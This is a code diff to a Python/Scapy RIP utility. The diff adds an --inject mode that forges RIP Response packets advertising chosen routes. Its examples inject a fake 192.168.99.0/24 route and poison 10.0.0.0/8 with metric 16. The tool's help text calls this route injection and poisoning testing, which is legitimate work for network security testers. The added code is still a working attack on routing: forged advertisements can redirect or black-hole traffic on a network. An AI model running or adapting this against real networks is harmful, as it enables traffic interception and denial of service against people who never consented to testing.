@@ -25,8 +25,13 @@ Options:
   --count N            Number of Request packets to send (default: 1)
   --timeout SECS       Seconds to listen for responses (default: 10)
   --send-only          Only send the Request; skip response capture
+  --inject             Send a RIP Response (cmd=2) instead of a Request.
+                       Advertises the specified --entry routes as if this
+                       host were a RIP router. Requires at least one --entry
+                       (or --entry-network/mask). Useful for route injection
+                       and poisoning tests.
 
-Route entry options (RIP Request body):
+Route entry options (RIP Request/Response body):
   By default a single "wildcard" entry (AFI=0, metric=16) is sent, asking
   the router to return its full routing table (RFC 2453 §3.9.1).
   Use the options below to query specific prefixes instead.
@@ -61,6 +66,14 @@ Examples:
   # Multiple specific prefixes
   python3 rip_request.py --iface eth0 --target 10.0.0.1 \
       --entry 10.1.0.0/255.255.0.0 --entry 172.16.0.0/255.240.0.0
+
+  # Inject a fake route (send RIP Response advertising 192.168.99.0/24)
+  python3 rip_request.py --iface eth0 --inject \
+      --entry 192.168.99.0/255.255.255.0:10.0.0.254:0:1
+
+  # Route poisoning: advertise a prefix with metric=16 (unreachable)
+  python3 rip_request.py --iface eth0 --inject \
+      --entry 10.0.0.0/255.0.0.0:0.0.0.0:0:16 --count 3
 """
 
 import argparse
@@ -103,6 +116,11 @@ def parse_args():
                    help="Seconds to listen for responses (default: 10)")
     p.add_argument("--send-only", action="store_true",
                    help="Only send the Request packet; skip response capture")
+    p.add_argument("--inject", action="store_true",
+                   help="Send a RIP Response (cmd=2) advertising the specified "
+                        "--entry routes as if this host were a RIP router. "
+                        "Requires at least one --entry or --entry-network/mask. "
+                        "Skips response capture (implies --send-only).")
 
     # --- Route entry arguments ---
     ent = p.add_argument_group(
@@ -196,8 +214,24 @@ def build_rip_request(version: int, entries=None) -> bytes:
     return header + body
 
 
-# ---------------------------------------------------------------------------
-# RIP response parsing
+def build_rip_response(version: int, entries: list) -> bytes:
+    """
+    Build a RIP Response packet (cmd=2) advertising one or more routes.
+    All entries use AFI=2 (AF_INET). This is what a real RIP router sends;
+    injecting it can add routes to neighbouring routers' tables.
+    """
+    header = struct.pack("!BBH", 2, version, 0)
+    body = b""
+    for e in entries:
+        body += _build_entry(
+            2,
+            e.get("tag",     0),
+            e.get("network", "0.0.0.0"),
+            e.get("mask",    "0.0.0.0"),
+            e.get("nexthop", "0.0.0.0"),
+            e.get("metric",  1),
+        )
+    return header + body
 # ---------------------------------------------------------------------------
 def parse_rip_response(payload: bytes, src: str, routes: list):
     """Parse raw UDP payload of a RIP Response (cmd=2) and print routes."""
@@ -292,13 +326,14 @@ def main():
             dst_ip  = "255.255.255.255"
             dst_mac = args.dst_mac or "ff:ff:ff:ff:ff:ff"
 
-    print(f"[*] RIPv{version} Request")
+    print(f"[*] RIPv{version} {'Inject (Response)' if args.inject else 'Request'}")
     print(f"    iface   : {iface}")
     print(f"    src     : {src_ip}:{args.sport}  ({src_mac or 'auto'})")
     print(f"    dst     : {dst_ip}:{args.dport}  ({dst_mac})")
     print(f"    ttl     : {args.ttl}")
     print(f"    count   : {args.count}")
-    print(f"    timeout : {args.timeout}s")
+    if not args.inject:
+        print(f"    timeout : {args.timeout}s")
     print()
 
     # --- Build route entry list from CLI ---
@@ -329,15 +364,21 @@ def main():
         }]
 
     if route_entries:
-        print(f"[*] Request entries ({len(route_entries)}):")
+        print(f"[*] {'Inject' if args.inject else 'Request'} entries ({len(route_entries)}):")
         for e in route_entries:
             print(f"    {e['network']}/{e['mask']}  nexthop={e['nexthop']}  "
                   f"tag={e['tag']}  metric={e['metric']}")
     else:
+        if args.inject:
+            print("[!] --inject requires at least one --entry (or --entry-network/mask).",
+                  file=sys.stderr)
+            sys.exit(1)
         print("[*] Request entry: wildcard (AFI=0, metric=16) — full routing table")
     print()
 
-    rip_data = build_rip_request(version, route_entries)
+    rip_data = (build_rip_response(version, route_entries)
+                if args.inject
+                else build_rip_request(version, route_entries))
 
     # Build the packet.
     # Key points:
@@ -361,9 +402,11 @@ def main():
         for i in range(args.count):
             sendp(pkt, iface=iface, verbose=False)
             if args.count > 1:
-                print(f"[+] RIP Request sent ({i + 1}/{args.count})")
+                label = "Response" if args.inject else "Request"
+                print(f"[+] RIP {label} sent ({i + 1}/{args.count})")
         if args.count == 1:
-            print("[+] RIP Request sent")
+            label = "Response (inject)" if args.inject else "Request"
+            print(f"[+] RIP {label} sent")
     except PermissionError:
         print("[!] Permission denied — re-run with sudo/root", file=sys.stderr)
         sys.exit(1)
@@ -371,7 +414,7 @@ def main():
         print(f"[!] Send failed: {exc}", file=sys.stderr)
         sys.exit(1)
 
-    if args.send_only:
+    if args.send_only or args.inject:
         return
 
     print(f"[*] Listening for RIP Responses on UDP/520 for {args.timeout}s ...")
